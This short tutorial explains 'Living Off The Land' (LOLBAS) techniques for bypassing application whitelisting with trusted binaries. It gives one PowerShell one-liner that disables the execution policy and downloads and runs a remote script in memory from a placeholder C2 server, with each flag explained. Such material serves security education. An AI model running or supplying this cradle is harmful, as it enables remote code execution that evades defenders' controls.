Living Off The Land (LOLBAS)

This technique involves using legitimate, pre-installed tools and binaries on a system to carry out malicious actions, thereby bypassing security controls like AWL.

Why LOLBAS Works

  • Whitelisted Binaries: Tools like powershell.exe, cmd.exe, certutil.exe are often trusted.
  • No New Executables: Malicious code runs within the context of an approved application.
  • Reduced Detection: Appears as legitimate system activity, making it harder for AWL to flag.
Key Takeaway

LOLBAS leverages trusted system binaries to execute malicious code, making it a potent AWL bypass technique.

LOLBAS Example: PowerShell

Using powershell.exe to download and execute a remote script.

powershell.exe -NoP -NonI -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://your_c2_server/malicious_script.ps1'); Invoke-MaliciousFunction"

Explanation:

  • -NoP: No Profile (prevents loading user profiles).
  • -NonI: Non-Interactive (prevents an interactive prompt).
  • -Exec Bypass: Sets the execution policy to bypass, allowing scripts to run.
  • IEX (New-Object Net.WebClient).DownloadString(...): Downloads and executes a remote PowerShell script directly in memory.
